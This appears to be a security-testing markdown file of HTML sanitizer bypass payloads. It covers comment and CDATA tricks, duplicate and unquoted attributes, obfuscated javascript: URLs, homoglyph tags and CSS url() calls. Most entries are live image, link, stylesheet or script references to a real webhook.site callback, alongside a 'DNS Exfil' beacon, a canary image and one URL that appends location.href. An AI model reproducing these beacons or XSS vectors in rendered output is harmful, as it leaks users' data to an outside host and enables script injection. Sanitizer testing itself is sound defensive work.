# Security Research - v36

## HTML Comment & Attribute Injection Testing

Testing comment handling, CDATA sections, and attribute-based attacks.

---

### 1) HTML Comment Variations

<!-- Normal comment -->

<!- Single dash comment -->

<!--- Triple dash comment --->

<!--> Truncated comment -->

<!--x<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/comment-img.gif">-->

<!----><img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-dash-img.gif"><!---->

---

### 2) CDATA Sections

<![CDATA[<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cdata-img.gif">]]>

---

### 3) Processing Instructions

<?xml version="1.0"?>
<?xml-stylesheet href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/pi-style.css"?>

---

### 4) Null Byte Injection

<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00byte.gif">

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00link">Null in href</a>

---

### 5) Attribute Without Quotes

<a href=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-href>No Quotes Link</a>

<img src=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-img.gif>

---

### 6) Mixed Quote Styles

<a href='https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/single-quote'>Single Quotes</a>

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-quote">Double Quotes</a>

---

### 7) Attribute Order Manipulation

<a onclick="alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order1">Onclick First</a>

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order2" onclick="alert(1)">Href First</a>

---

### 8) Duplicate Attributes

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-first" href="javascript:alert(1)">Duplicate href</a>

<a href="javascript:alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-second">Duplicate href reversed</a>

<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-img-first.gif" src="javascript:alert(1)">

---

### 9) Newlines in Attributes

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline
link">Newline in href</a>

<a href="java
script:alert(1)">JS with newline</a>

---

### 10) Tab Characters in Protocol

<a href="java	script:alert(1)">JS with tab</a>

<a href="	javascript:alert(1)">Leading tab JS</a>

---

### 11) Entity Encoded Tags

&lt;script&gt;alert(1)&lt;/script&gt;

&#60;script&#62;alert(1)&#60;/script&#62;

&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

---

### 12) Backtick Attribute Delimiter

<a href=`https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/backtick`>Backtick href</a>

---

### 13) Tag Name Confusion

<a/href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/slash-sep">Slash separator</a>

<a	href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/tab-sep">Tab separator</a>

<a
href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline-sep">Newline separator</a>

---

### 14) Unicode Tag Names

<а href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cyrillic-a">Cyrillic A tag</а>

<ａ href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/fullwidth-a">Fullwidth A tag</ａ>

---

### 15) Self-Closing Tag Abuse

<script/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/script-self-close.js"/>

<img/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/img-self-close.gif"/>

---

### 16) XML Namespace Injection

<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/xmlns-link">XLink href</a>

<svg:a xmlns:svg="http://www.w3.org/2000/svg" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/svg-xmlns">SVG namespaced</svg:a>

---

### 17) CSS Expression Attempt

<div style="background:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-bg.gif)">CSS bg</div>

<div style="list-style-image:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-list.gif)">CSS list</div>

---

### 18) srcset Attribute

<img srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-1x.gif 1x, https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-2x.gif 2x">

---

### 19) Picture Element

<picture>
<source srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-source.gif">
<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-fallback.gif">
</picture>

---

### 20) Template Literal Injection

<div data-test="${alert(1)}">Template literal in data attr</div>

<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/${location.href}">Template in URL</a>

---

### DNS Exfil

![dns](https://v36-dns.b54c2a11-5e05-48b6-88fd-1ea979df7f5b.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/v36-canary.gif)

---

*v36 - HTML comments, CDATA, and attribute injection*
